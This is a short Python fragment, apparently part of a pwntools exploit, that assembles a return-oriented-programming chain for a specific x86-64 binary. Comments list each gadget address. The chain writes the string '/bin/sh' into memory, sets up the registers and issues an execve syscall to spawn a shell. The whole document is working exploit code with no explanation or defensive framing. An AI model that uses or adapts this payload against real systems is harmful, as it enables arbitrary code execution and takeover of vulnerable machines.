payload = p64(0x405a46)
#0x0000000000405a46: pop rbx; ret; 
payload += p64(0x421246)+p64(0x405a44)
# 0x0000000000405a44: mov eax, ebx; pop rbx; ret; 
payload += p64(0x0)+p64(0x405a46)
# 0x0000000000405a46: pop rbx; ret; 
payload += p64(0x70)+p64(0x406f41)
# 0x0000000000406f41: mov qword ptr [rax], rbx; pop rbx; ret; 
payload += p64(0x0)+p64(0x405a46)
# 0x0000000000405a46: pop rbx; ret; 
payload += p64(0x421070)+p64(0x405a44)
# 0x0000000000405a44: mov eax, ebx; pop rbx; ret; 
payload += p64(0x0)+p64(0x405a46)
# 0x0000000000405a46: pop rbx; ret; 
payload += p64(0x68662f6e69622f)+p64(0x406f41)
# 0x0000000000406f41: mov qword ptr [rax], rbx; pop rbx; ret; 
payload += p64(0x0)+p64(0x4058ff)
# 0x00000000004058ff: pop rsi; ret; 
payload += p64(0x0)+p64(0x41c864)
# 0x000000000041c864: mov edi, 0x200; add edi, edi; ret 0; 
payload += p64(0x40125d)
# 0x000000000040125d: pop rbp; ret; 
payload += p64(0x42128c)+p64(0x412580)
# 0x0000000000412580: add dl, byte ptr [rbp - 0x46]; add edi, edx; ret; 
payload += p64(0x405a46)
# 0x0000000000405a46: pop rbx; ret; 
payload += p64(0x3b)+p64(0x405a44)
# 0x0000000000405a44: mov eax, ebx; pop rbx; ret; 
payload += p64(0x0)+p64(0x41b92e)
# 0x000000000041b92e: pop rdx; cld; ret; 
payload += p64(0x0)+p64(0x409657)
# 0x0000000000409657: syscall; 
payload += b''
